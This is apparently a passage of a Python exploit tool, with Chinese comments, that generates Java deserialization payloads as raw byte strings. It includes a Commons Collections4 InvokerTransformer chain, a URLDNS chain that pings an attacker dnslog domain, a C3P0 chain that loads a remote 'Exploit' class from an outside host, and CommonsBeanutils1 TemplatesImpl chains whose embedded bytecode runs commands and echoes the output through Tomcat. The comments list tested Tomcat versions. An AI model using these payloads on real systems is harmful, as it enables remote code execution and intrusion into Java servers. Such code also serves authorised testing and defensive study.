0\x14M-\x12\x16\x06\xbd\x00\x0cY\x03\x12\x18SY\x04\xb2\x00\x1eSY\x05\xb2\x00\x1eS\xb6\x00",\x06\xbd\x00\x04Y\x03+SY\x04\xbb\x00\x1aY\x03\xb7\x00&SY\x05\xbb\x00\x1aY+\xbe\xb7\x00&S\xb6\x00,W*\xb6\x000\x122\x04\xbd\x00\x0cY\x03-S\xb6\x005*\x04\xbd\x00\x04Y\x03,S\xb6\x00,W\xa7\x00\x8d:\x04\x129\xb8\x00\x10N-\x12;\x04\xbd\x00\x0cY\x03\x12\x18S\xb6\x00"-\x04\xbd\x00\x04Y\x03+S\xb6\x00,M*\xb6\x000\x122\x04\xbd\x00\x0cY\x03-S\xb6\x005*\x04\xbd\x00\x04Y\x03,S\xb6\x00,W\xa7\x00H:\x04\x129\xb8\x00\x10N-\x12;\x04\xbd\x00\x0cY\x03\x12\x18S\xb6\x00"-\x04\xbd\x00\x04Y\x03+S\xb6\x00,M*\xb6\x000\x122\x04\xbd\x00\x0cY\x03-S\xb6\x005*\x04\xbd\x00\x04Y\x03,S\xb6\x00,W\xa7\x00\x03\xb1\x00\x02\x00\x00\x00h\x00k\x007\x00\x00\x00h\x00\xb0\x00=\x00\x01\x00B\x00\x00\x00\x17\x00\x03\xf7\x00k\x07\x007\xf7\x00D\x07\x00=\xfd\x00D\x07\x00\x04\x07\x00\x0c\x00?\x00\x00\x00\x04\x00\x01\x00A\x00\n\x00C\x00D\x00\x02\x00>\x00\x00\x00~\x00\x03\x00\x05\x00\x00\x00?\x01M*\xb6\x000N\xa7\x00\x19-+\xb6\x00HM\xa7\x00\x16\xa7\x00\x00:\x04-\xb6\x00MN\xa7\x00\x03-\x12\x04\xa6\xff\xe7,\x01\xa6\x00\x0c\xbb\x00JY+\xb7\x00P\xbf,\x04\xb6\x00V,*\xb6\x00\\\xb0\x00\x01\x00\n\x00\x13\x00\x16\x00J\x00\x01\x00B\x00\x00\x00%\x00\x06\xfd\x00\n\x07\x00X\x07\x00\x0c\x08\xff\x00\x02\x00\x04\x07\x00\x04\x07\x00^\x07\x00X\x07\x00\x0c\x00\x01\x07\x00J\t\x05\r\x00?\x00\x00\x00\x04\x00\x01\x00A\x00\x01\x00#\x00_\x00\x02\x00>\x00\x00\x036\x00\x08\x00\r\x00\x00\x02?*\xb7\x00\xea\x036\x04\xb8\x00g\xb6\x00k\x12m\xb8\x00o\xc0\x00q:\x05\x036\x06\x15\x06\x19\x05\xbe\xa2\x02\x1f\x19\x05\x15\x062:\x07\x19\x07\x01\xa6\x00\x06\xa7\x02\t\x19\x07\xb6\x00uN-\x12w\xb6\x00{\x9a\x00\x0c-\x12}\xb6\x00{\x9a\x00\x06\xa7\x01\xee\x19\x07\x12\x7f\xb8\x00oL+\xc1\x00\x81\x9a\x00\x06\xa7\x01\xdc+\x12\x83\xb8\x00o\x12\x85\xb8\x00o\x12\x87\xb8\x00oL\xa7\x00\x0b:\x08\xa7\x01\xc3\xa7\x00\x00+\x12\x89\xb8\x00o\xc0\x00\x8b:\t\x036\n\x15\n\x19\t\xb9\x00\x8f\x01\x00\xa2\x01\x9e\x19\t\x15\n\xb9\x00\x92\x02\x00:\x0b\x19\x0b\x12\x94\xb8\x00oL+\xb6\x000\x12\x96\x03\xbd\x00\x0c\xb6\x005+\x03\xbd\x00\x04\xb6\x00,M+\xb6\x000\x12\x98\x04\xbd\x00\x0cY\x03\x12^S\xb6\x005+\x04\xbd\x00\x04Y\x03\x12\x9aS\xb6\x00,\xc0\x00^N-\x01\xa5\x00\n-\xb6\x00\x9e\x99\x00\x06\xa7\x00X,\xb6\x000\x12\xa0\x04\xbd\x00\x0cY\x03\xb2\x00\x1eS\xb6\x005,\x04\xbd\x00\x04Y\x03\xbb\x00\x1aY\x11\x00\xc8\xb7\x00&S\xb6\x00,W,\xb6\x000\x12\xa2\x05\xbd\x00\x0cY\x03\x12^SY\x04\x12^S\xb6\x005,\x05\xbd\x00\x04Y\x03\x12\x9aSY\x04-S\xb6\x00,W\x046\x04+\xb6\x000\x12\x98\x04\xbd\x00\x0cY\x03\x12^S\xb6\x005+\x04\xbd\x00\x04Y\x03\x12\xa4S\xb6\x00,\xc0\x00^N-\x01\xa5\x00\n-\xb6\x00\x9e\x99\x00\x06\xa7\x00\x8d,\xb6\x000\x12\xa0\x04\xbd\x00\x0cY\x03\xb2\x00\x1eS\xb6\x005,\x04\xbd\x00\x04Y\x03\xbb\x00\x1aY\x11\x00\xc8\xb7\x00&S\xb6\x00,W\x12\xa6\xb8\x00\xac\xb6\x00\xaf\x12\xb1\xb6\x00{\x99\x00\x18\x06\xbd\x00^Y\x03\x12\xb3SY\x04\x12\xb5SY\x05-S\xa7\x00\x15\x06\xbd\x00^Y\x03\x12\xb7SY\x04\x12\xb9SY\x05-S:\x0c,\xbb\x00\xbbY\xbb\x00\xbdY\x19\x0c\xb7\x00\xc0\xb6\x00\xc4\xb6\x00\xca\xb7\x00\xcd\x12\xcf\xb6\x00\xd3\xb6\x00\xd6\xb6\x00\xda\xb8\x00\xdc\x046\x04-\x01\xa5\x00\n-\xb6\x00\x9e\x99\x00\x08\x15\x04\x9a\x00\x06\xa7\x00\x10,\xb8\x00\xe0\xb6\x00\xe5\xb6\x00\xda\xb8\x00\xdc\x15\x04\x99\x00\x06\xa7\x00\t\x84\n\x01\xa7\xfe\\\x15\x04\x99\x00\x06\xa7\x00\t\x84\x06\x01\xa7\xfd\xdf\xb1\x00\x01\x00_\x00p\x00s\x00A\x00\x01\x00B\x00\x00\x00\xdd\x00\x19\xff\x00\x1a\x00\x07\x07\x00\x02\x00\x00\x00\x01\x07\x00q\x01\x00\x00\xfc\x00\x17\x07\x00c\xff\x00\x17\x00\x08\x07\x00\x02\x00\x00\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x00\x02\xff\x00\x11\x00\x08\x07\x00\x02\x07\x00\x04\x00\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x00S\x07\x00A\x04\xff\x00\x02\x00\x08\x07\x00\x02\x07\x00\x04\x00\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x00\xfe\x00\r\x00\x07\x00\x8b\x01\xff\x00c\x00\x0c\x07\x00\x02\x07\x00\x04\x07\x00\x04\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x07\x00\x8b\x01\x07\x00\x04\x00\x00\x02\xfb\x00T.\x02\xfb\x00MQ\x07\x00\xe7)\x0b\x04\x02\x0c\x07\xff\x00\x05\x00\x0b\x07\x00\x02\x07\x00\x04\x00\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x07\x00\x8b\x01\x00\x00\xff\x00\x07\x00\x08\x07\x00\x02\x00\x00\x00\x01\x07\x00q\x01\x07\x00c\x00\x00\xfa\x00\x05\x00?\x00\x00\x00\x04\x00\x01\x00A\x00\x01\x00\x05\x00\x00\x00\x02\x00\x06pt\x00\x04Pwnrpw\x01\x00xsr\x00+org.apache.commons.collections4.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\x07factoryt\x00-Lorg/apache/commons/collections4/Transformer;xpsr\x00;org.apache.commons.collections4.functors.InvokerTransformer\x87\xe8\xffk{|\xce8\x02\x00\x03[\x00\x05iArgst\x00\x13[Ljava/lang/Object;L\x00\x0biMethodNameq\x00~\x00\n[\x00\x0biParamTypesq\x00~\x00\txpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x00t\x00\x0enewTransformerur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x00sq\x00~\x00\x00?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x00xxt\x00\x01tx'

        # dnslog的长度确定的情况下，可以对字符串进行替换

        # URLDNS http://7777777777.urldns.qq.dnslog.cn/test
        urldns_url   = 'http://{0}.urldns.{1}/test'.format(_BANNER, self.DOMAIN)
        urldns_url_b = urldns_url.encode()
        urldns_host  = '{0}.urldns.{1}'.format(_BANNER, self.DOMAIN)
        urldns_host_b= urldns_host.encode()
        __bb_URLDNS = b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x01sr\x00\x0cjava.net.URL\x96%76\x1a\xfc\xe4r\x03\x00\x07I\x00\x08hashCodeI\x00\x04portL\x00\tauthorityt\x00\x12Ljava/lang/String;L\x00\x04fileq\x00~\x00\x03L\x00\x04hostq\x00~\x00\x03L\x00\x08protocolq\x00~\x00\x03L\x00\x03refq\x00~\x00\x03xp\xff\xff\xff\xff\xff\xff\xff\xfft" +  struct.pack('>H', len(urldns_host_b)) + urldns_host_b + b"t\x00\x05/testq\x00~\x00\x05t\x00\x04httppxt" + struct.pack('>H', len(urldns_url_b)) + urldns_url_b + b"x"
        # str -> bytes , 这个方法会让一些特殊字节消失
        #__bb_URLDNS = bytes(s__bb_URLDNS, encoding = "utf8")


        # http://7777777777.c3p0.qq.dnslog.cn/:Exploit
        c3p0_host =  'http://{0}.c3p0.{1}'.format(_BANNER, self.DOMAIN)
        c3p0_host_b= c3p0_host.encode()
        __bb_C3P0 = b'\xac\xed\x00\x05sr\x00(com.mchange.v2.c3p0.PoolBackedDataSource\xde"\xcdl\xc7\xff\x7f\xa8\x02\x00\x00xr\x005com.mchange.v2.c3p0.impl.AbstractPoolBackedDataSource\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x00xr\x001com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x08I\x00\x10numHelperThreadsL\x00\x18connectionPoolDataSourcet\x00$Ljavax/sql/ConnectionPoolDataSource;L\x00\x0edataSourceNamet\x00\x12Ljava/lang/String;L\x00\nextensionst\x00\x0fLjava/util/Map;L\x00\x14factoryClassLocationq\x00~\x00\x04L\x00\ridentityTokenq\x00~\x00\x04L\x00\x03pcst\x00"Ljava/beans/PropertyChangeSupport;L\x00\x03vcst\x00"Ljava/beans/VetoableChangeSupport;xpw\x02\x00\x01sr\x00=com.mchange.v2.naming.ReferenceIndirector$ReferenceSerializedb\x19\x85\xd0\xd1*\xc2\x13\x02\x00\x04L\x00\x0bcontextNamet\x00\x13Ljavax/naming/Name;L\x00\x03envt\x00\x15Ljava/util/Hashtable;L\x00\x04nameq\x00~\x00\nL\x00\treferencet\x00\x18Ljavax/naming/Reference;xppppsr\x00\x16javax.naming.Reference\xe8\xc6\x9e\xa2\xa8\xe9\x8d\t\x02\x00\x04L\x00\x05addrst\x00\x12Ljava/util/Vector;L\x00\x0cclassFactoryq\x00~\x00\x04L\x00\x14classFactoryLocationq\x00~\x00\x04L\x00\tclassNameq\x00~\x00\x04xpsr\x00\x10java.util.Vector\xd9\x97}[\x80;\xaf\x01\x03\x00\x03I\x00\x11capacityIncrementI\x00\x0celementCount[\x00\x0belementDatat\x00\x13[Ljava/lang/Object;xp\x00\x00\x00\x00\x00\x00\x00\x00ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\nppppppppppxt\x00\x07Exploitt' + struct.pack('>H', len(c3p0_host_b)+1) + c3p0_host_b + b'/t\x00\x07exploitppppw\x04\x00\x00\x00\x00xw\x02\x00\x01x'    

        # CommonsBeanutils1(Tomcat回显)
        # Tested on Tomcat 7.0.105, 8.0.38, 8.5.53, 9.0.37
        # 这里之所以拆分成了两个payload，是因为带回显的payload实现太长，没法再添加Testecho的payload了，而Testecho又确实是一个需求
        # 为了减少代码，没有设置响应头200，所以看到的是500有点丑(够用就行)
        #__bb_CommonsBeanutils1_tomcat_echo = b'\xac\xed\x00\x05sr\x00\x17java.util.PriorityQueue\x94\xda0\xb4\xfb?\x82\xb1\x03\x00\x02I\x00\x04sizeL\x00\ncomparatort\x00\x16Ljava/util/Comparator;xp\x00\x00\x00\x02sr\x00+org.apache.commons.beanutils.BeanComparator\xe3\xa1\x88\xeas"\xa4H\x02\x00\x02L\x00\ncomparatorq\x00~\x00\x01L\x00\x08propertyt\x00\x12Ljava/lang/String;xpsr\x00?org.apache.commons.collections.comparators.ComparableComparator\xfb\xf4\x99%\xb8n\xb17\x02\x00\x00xpt\x00\x10outputPropertiesw\x04\x00\x00\x00\x03sr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\tI\x00\r_indentNumberI\x00\x0e_transletIndexZ\x00\x15_useServicesMechanismL\x00\x19_accessExternalStylesheetq\x00~\x00\x04L\x00\x0b_auxClassest\x00;Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable;[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_nameq\x00~\x00\x04L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xff\xff\xff\xff\x00t\x00\x03allpur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp\x00\x00\x0fy\xca\xfe\xba\xbe\x00\x00\x003\x00\xb2\n\x00+\x00f\n\x00g\x00h\n\x00g\x00i\n\x00\x1d\x00j\x08\x00Y\n\x00\x1b\x00k\n\x00l\x00m\n\x00l\x00n\x07\x00Z\n\x00g\x00o\x08\x00p\n\x00 \x00q\x08\x00r\x08\x00s\x07\x00t\x08\x00u\x08\x00>\x07\x00v\n\x00\x1b\x00w\x08\x00x\x08\x00O\x07\x00y\x0b\x00\x16\x00z\x0b\x00\x16\x00{\x08\x00E\x08\x00|\x07\x00}\n\x00\x1b\x00~\x07\x00\x7f\n\x00\x80\x00\x81\x08\x00\x82\x07\x00\x83\x08\x00\x84\n\x00 \x00\x85\x08\x00\x86\t\x00%\x00\x87\x07\x00\x88\n\x00%\x00\x89\x08\x00\x8a\x07\x00\x8b\n\x00(\x00\x8c\x07\x00\x8d\x07\x00\x8e\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00\x1aLysoserial/MyClassLoader2;\x01\x00\ttransform\x01\x00r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V\x01\x00\x08document\x01\x00-Lcom/sun/org/apache/xalan/internal/xsltc/DOM;\x01\x00\x08handlers\x01\x00B[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;\x01\x00\nExceptions\x07\x00\x8f\x01\x00\xa6(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V\x01\x00\x08iterator\x01\x005Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;\x01\x00\x07handler\x01\x00ALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;\x01\x00\x08<clinit>\x01\x00\x01e\x01\x00 Ljava/lang/NoSuchFieldException;\x01\x00\tprocessor\x01\x00\x12Ljava/lang/Object;\x01\x00\x03req\x01\x00\x04resp\x01\x00\x04str2\x01\x00\x12Ljava/lang/String;\x01\x00\x01j\x01\x00\x01I\x01\x00\x01t\x01\x00\x12Ljava/lang/Thread;\x01\x00\x03str\x01\x00\x03obj\x01\x00\nprocessors\x01\x00\x10Ljava/util/List;\x01\x00\x15Ljava/lang/Exception;\x01\x00\x01i\x01\x00\x04flag\x01\x00\x01Z\x01\x00\x05group\x01\x00\x17Ljava/lang/ThreadGroup;\x01\x00\x01f\x01\x00\x19Ljava/lang/reflect/Field;\x01\x00\x07threads\x01\x00\x13[Ljava/lang/Thread;\x01\x00\rStackMapTable\x07\x00\x90\x07\x00\x91\x07\x00\x92\x07\x00\x83\x07\x00\x7f\x07\x00v\x07\x00y\x07\x00\x8b\x01\x00\nSourceFile\x01\x00\x13MyClassLoader2.java\x0c\x00,\x00-\x07\x00\x92\x0c\x00\x93\x00\x94\x0c\x00\x95\x00\x96\x0c\x00\x97\x00\x98\x0c\x00\x99\x00\x9a\x07\x00\x91\x0c\x00\x9b\x00\x9c\x0c\x00\x9d\x00\x9e\x0c\x00\x9f\x00\xa0\x01\x00\x04exec\x0c\x00\xa1\x00\xa2\x01\x00\x04http\x01\x00\x06target\x01\x00\x12java/lang/Runnable\x01\x00\x06this$0\x01\x00\x1ejava/lang/NoSuchFieldException\x0c\x00\xa3\x00\x98\x01\x00\x06global\x01\x00\x0ejava/util/List\x0c\x00\xa4\x00\xa5\x0c\x00\x9d\x00\xa6\x01\x00\x0bgetResponse\x01\x00\x0fjava/lang/Class\x0c\x00\xa7\x00\xa8\x01\x00\x10java/lang/Object\x07\x00\xa9\x0c\x00\xaa\x00\xab\x01\x00\tgetHeader\x01\x00\x10java/lang/String\x01\x00\x08Testecho\x0c\x00\xac\x00\xad\x01\x00\tsetStatus\x0c\x00\xae\x00\xaf\x01\x00\x11java/lang/Integer\x0c\x00,\x00\xb0\x01\x00\taddHeader\x01\x00\x13java/lang/Exception\x0c\x00\xb1\x00-\x01\x00\x18ysoserial/MyClassLoader2\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x01\x009com/sun/org/apache/xalan/internal/xsltc/TransletException\x01\x00\x15java/lang/ThreadGroup\x01\x00\x17java/lang/reflect/Field\x01\x00\x10java/lang/Thread\x01\x00\rcurrentThread\x01\x00\x14()Ljava/lang/Thread;\x01\x00\x0egetThreadGroup\x01\x00\x19()Ljava/lang/ThreadGroup;\x01\x00\x08getClass\x01\x00\x13()Ljava/lang/Class;\x01\x00\x10getDeclaredField\x01\x00-(Ljava/lang/String;)Ljava/lang/reflect/Field;\x01\x00\rsetAccessible\x01\x00\x04(Z)V\x01\x00\x03get\x01\x00&(Ljava/lang/Object;)Ljava/lang/Object;\x01\x00\x07getName\x01\x00\x14()Ljava/lang/String;\x01\x00\x08contains\x01\x00\x1b(Ljava/lang/CharSequence;)Z\x01\x00\rgetSuperclass\x01\x00\x04size\x01\x00\x03()I\x01\x00\x15(I)Ljava/lang/Object;\x01\x00\tgetMethod\x01\x00@(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\x01\x00\x18java/lang/reflect/Method\x01\x00\x06invoke\x01\x009(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\x01\x00\x07isEmpty\x01\x00\x03()Z\x01\x00\x04TYPE\x01\x00\x11Ljava/lang/Class;\x01\x00\x04(I)V\x01\x00\x0fprintStackTrace\x00!\x00*\x00+\x00\x00\x00\x00\x00\x04\x00\x01\x00,\x00-\x00\x01\x00.\x00\x00\x00/\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x02\x00/\x00\x00\x00\x06\x00\x01\x00\x00\x00\x15\x000\x00\x00\x00\x0c\x00\x01\x00\x00\x00\x05\x001\x002\x00\x00\x00\x01\x003\x004\x00\x02\x00.\x00\x00\x00?\x00\x00\x00\x03\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00/\x00\x00\x00\x06\x00\x01\x00\x00\x00^\x000\x00\x00\x00 \x00\x03\x00\x00\x00\x01\x001\x002\x00\x00\x00\x00\x00\x01\x005\x006\x00\x01\x00\x00\x00\x01\x007\x008\x00\x02\x009\x00\x00\x00\x04\x00\x01\x00:\x00\x01\x003\x00;\x00\x02\x00.\x00\x00\x00I\x00\x00\x00\x04\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00/\x00\x00\x00\x06\x00\x01\x00\x00\x00c\x000\x00\x00\x00*\x00\x04\x00\x00\x00\x01\x001\x002\x00\x00\x00\x00\x00\x01\x005\x006\x00\x01\x00\x00\x00\x01\x00<\x00=\x00\x02\x00\x00\x00\x01\x00>\x00?\x00\x03\x009\x00\x00\x00\x04\x00\x01\x00:\x00\x08\x00@\x00-\x00\x01\x00.\x00\x00\x04\x9c\x00\x08\x00\x0e\x00\x00\x02\x0e\x03;\xb8\x00\x02\xb6\x00\x03L+\xb6\x00\x04\x12\x05\xb6\x00\x06M,\x04\xb6\x00\x07,+\xb6\x00\x08\xc0\x00\t\xc0\x00\tN\x036\x04\x15\x04-\xbe\xa2\x01\xda-\x15\x042:\x05\x19\x05\xc7\x00\x06\xa7\x01\xc6\x19\x05\xb6\x00\n:\x06\x19\x06\x12\x0b\xb6\x00\x0c\x9a\x00\r\x19\x06\x12\r\xb6\x00\x0c\x9a\x00\x06\xa7\x01\xa8\x19\x05\xb6\x00\x04\x12\x0e\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x05\xb6\x00\x08:\x07\x19\x07\xc1\x00\x0f\x9a\x00\x06\xa7\x01\x85\x19\x07\xb6\x00\x04\x12\x10\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x07\xb6\x00\x08:\x07\x19\x07\xb6\x00\x04\x12\x11\xb6\x00\x06M\xa7\x00\x16:\x08\x19\x07\xb6\x00\x04\xb6\x00\x13\xb6\x00\x13\x12\x11\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x07\xb6\x00\x08:\x07\x19\x07\xb6\x00\x04\xb6\x00\x13\x12\x14\xb6\x00\x06M\xa7\x00\x10:\x08\x19\x07\xb6\x00\x04\x12\x14\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x07\xb6\x00\x08:\x07\x19\x07\xb6\x00\x04\x12\x15\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x07\xb6\x00\x08\xc0\x00\x16\xc0\x00\x16:\x08\x036\t\x15\t\x19\x08\xb9\x00\x17\x01\x00\xa2\x00\xd8\x19\x08\x15\t\xb9\x00\x18\x02\x00:\n\x19\n\xb6\x00\x04\x12\x19\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\n\xb6\x00\x08:\x0b\x19\x0b\xb6\x00\x04\x12\x1a\x03\xbd\x00\x1b\xb6\x00\x1c\x19\x0b\x03\xbd\x00\x1d\xb6\x00\x1e:\x0c\x19\x0b\xb6\x00\x04\x12\x1f\x04\xbd\x00\x1bY\x03\x12 S\xb6\x00\x1c\x19\x0b\x04\xbd\x00\x1dY\x03\x12!S\xb6\x00\x1e\xc0\x00 :\r\x19\r\xc6\x00d\x19\x06\xb6\x00"\x9a\x00\\\x19\x0c\xb6\x00\x04\x12#\x04\xbd\x00\x1bY\x03\xb2\x00$S\xb6\x00\x1c\x19\x0c\x04\xbd\x00\x1dY\x03\xbb\x00%Y\x11\x00\xc8\xb7\x00&S\xb6\x00\x1eW\x19\x0c\xb6\x00\x04\x12\'\x05\xbd\x00\x1bY\x03\x12 SY\x04\x12 S\xb6\x00\x1c\x19\x0c\x05\xbd\x00\x1dY\x03\x12!SY\x04\x19\rS\xb6\x00\x1eW\x04;\x1a\x99\x00\x06\xa7\x00\t\x84\t\x01\xa7\xff"\x1a\x99\x00\x06\xa7\x00\x11\xa7\x00\x08:\x05\xa7\x00\x03\x84\x04\x01\xa7\xfe%\xa7\x00\x08K*\xb6\x00)\xb1\x00\x07\x00\x95\x00\xa0\x00\xa3\x00\x12\x00\xc3\x00\xd1\x00\xd4\x00\x12\x00.\x009\x01\xfa\x00(\x00<\x00W\x01\xfa\x00(\x00Z\x00z\x01\xfa\x00(\x00}\x01\xf4\x01\xfa\x00(\x00\x00\x02\x05\x02\x08\x00(\x00\x03\x00/\x00\x00\x00\xda\x006\x00\x00\x00\x1a\x00\x02\x00\x1b\x00\t\x00\x1c\x00\x13\x00\x1d\x00\x18\x00\x1e\x00$\x00\x1f\x00.\x00!\x004\x00"\x00<\x00#\x00C\x00$\x00Z\x00%\x00e\x00&\x00j\x00\'\x00r\x00(\x00}\x00)\x00\x88\x00*\x00\x8d\x00+\x00\x95\x00-\x00\xa0\x000\x00\xa3\x00.\x00\xa5\x00/\x00\xb6\x001\x00\xbb\x002\x00\xc3\x004\x00\xd1\x007\x00\xd4\x005\x00\xd6\x006\x00\xe1\x008\x00\xe6\x009\x00\xee\x00:\x00\xf9\x00;\x00\xfe\x00<\x01\x0c\x00=\x01\x1b\x00>\x01&\x00?\x011\x00@\x016\x00A\x01>\x00B\x01W\x00D\x01}\x00E\x01\x8a\x00G\x01\xb5\x00H\x01\xe1\x00I\x01\xe3\x00L\x01\xea\x00=\x01\xf0\x00N\x01\xf7\x00Q\x01\xfa\x00O\x01\xfc\x00P\x01\xff\x00\x1f\x02\x05\x00X\x02\x08\x00V\x02\t\x00W\x02\r\x00Y\x000\x00\x00\x00\xb6\x00\x12\x00\xa5\x00\x11\x00A\x00B\x00\x08\x00\xd6\x00\x0b\x00A\x00B\x00\x08\x01&\x00\xc4\x00C\x00D\x00\n\x01>\x00\xac\x00E\x00D\x00\x0b\x01W\x00\x93\x00F\x00D\x00\x0c\x01}\x00m\x00G\x00H\x00\r\x01\x0f\x00\xe1\x00I\x00J\x00\t\x004\x01\xc3\x00K\x00L\x00\x05\x00C\x01\xb4\x00M\x00H\x00\x06\x00r\x01\x85\x00N\x00D\x00\x07\x01\x0c\x00\xeb\x00O\x00P\x00\x08\x01\xfc\x00\x03\x00A\x00Q\x00\x05\x00\'\x01\xde\x00R\x00J\x00\x04\x00\x02\x02\x03\x00S\x00T\x00\x00\x00\t\x01\xfc\x00U\x00V\x00\x01\x00\x13\x01\xf2\x00W\x00X\x00\x02\x00$\x01\xe1\x00Y\x00Z\x00\x03\x02\t\x00\x04\x00A\x00Q\x00\x00\x00[\x00\x00\x00\xa8\x00\x13\xff\x00\'\x00\x05\x01\x07\x00\\\x07\x00]\x07\x00\t\x01\x00\x00\xfc\x00\x14\x07\x00^\xfc\x00\x1a\x07\x00_\x02\xfc\x00"\x07\x00`e\x07\x00a\x12]\x07\x00a\x0c\xfd\x00-\x07\x00b\x01\xff\x00\xd3\x00\x0e\x01\x07\x00\\\x07\x00]\x07\x00\t\x01\x07\x00^\x07\x00_\x07\x00`\x07\x00b\x01\x07\x00`\x07\x00`\x07\x00`\x07\x00_\x00\x00\xff\x00\x06\x00\n\x01\x07\x00\\\x07\x00]\x07\x00\t\x01\x07\x00^\x07\x00_\x07\x00`\x07\x00b\x01\x00\x00\xfa\x00\x05\xff\x00\x06\x00\x05\x01\x07\x00\\\x07\x00]\x07\x00\t\x01\x00\x00B\x07\x00c\x04\xff\x00\x05\x00\x00\x00\x00B\x07\x00c\x04\x00\x01\x00d\x00\x00\x00\x02\x00ept\x00\x13pwnr191114079014200pw\x01\x00xq\x00~\x00\x0ex' 
        
        # 这个可以用cmd: 头
        __bb_CommonsBeanutils1_tomcat_echo = b'\xac\xed\x00\x05sr\x00\x17java.util.PriorityQueue\x94\xda0\xb4\xfb?\x82\xb1\x03\x00\x02I\x00\x04sizeL\x00\ncomparatort\x00\x16Ljava/util/Comparator;xp\x00\x00\x00\x02sr\x00+org.apache.commons.beanutils.BeanComparator\xe3\xa1\x88\xeas"\xa4H\x02\x00\x02L\x00\ncomparatorq\x00~\x00\x01L\x00\x08propertyt\x00\x12Ljava/lang/String;xpsr\x00?org.apache.commons.collections.comparators.ComparableComparator\xfb\xf4\x99%\xb8n\xb17\x02\x00\x00xpt\x00\x10outputPropertiesw\x04\x00\x00\x00\x03sr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\tI\x00\r_indentNumberI\x00\x0e_transletIndexZ\x00\x15_useServicesMechanismL\x00\x19_accessExternalStylesheetq\x00~\x00\x04L\x00\x0b_auxClassest\x00;Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable;[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_nameq\x00~\x00\x04L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xff\xff\xff\xff\x00t\x00\x03allpur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp\x00\x00\x14A\xca\xfe\xba\xbe\x00\x00\x003\x01\x06\n\x00F\x00\x8a\n\x00\x8b\x00\x8c\n\x00\x8b\x00\x8d\n\x00\x1d\x00\x8e\x08\x00{\n\x00\x1b\x00\x8f\n\x00\x90\x00\x91\n\x00\x90\x00\x92\x07\x00|\n\x00\x8b\x00\x93\x08\x00\x94\n\x00 \x00\x95\x08\x00\x96\x08\x00\x97\x07\x00\x98\x08\x00\x99\x08\x00Y\x07\x00\x9a\n\x00\x1b\x00\x9b\x08\x00\x9c\x08\x00q\x07\x00\x9d\x0b\x00\x16\x00\x9e\x0b\x00\x16\x00\x9f\x08\x00h\x08\x00\xa0\x07\x00\xa1\n\x00\x1b\x00\xa2\x07\x00\xa3\n\x00\xa4\x00\xa5\x08\x00\xa6\x07\x00\xa7\x08\x00\xa8\n\x00 \x00\xa9\x08\x00\xaa\t\x00%\x00\xab\x07\x00\xac\n\x00%\x00\xad\x08\x00\xae\n\x00\xaf\x00\xb0\n\x00 \x00\xb1\x08\x00\xb2\x08\x00\xb3\x08\x00\xb4\x08\x00\xb5\x08\x00\xb6\x07\x00\xb7\x07\x00\xb8\n\x000\x00\xb9\n\x000\x00\xba\n\x00\xbb\x00\xbc\n\x00/\x00\xbd\x08\x00\xbe\n\x00/\x00\xbf\n\x00/\x00\xc0\n\x00 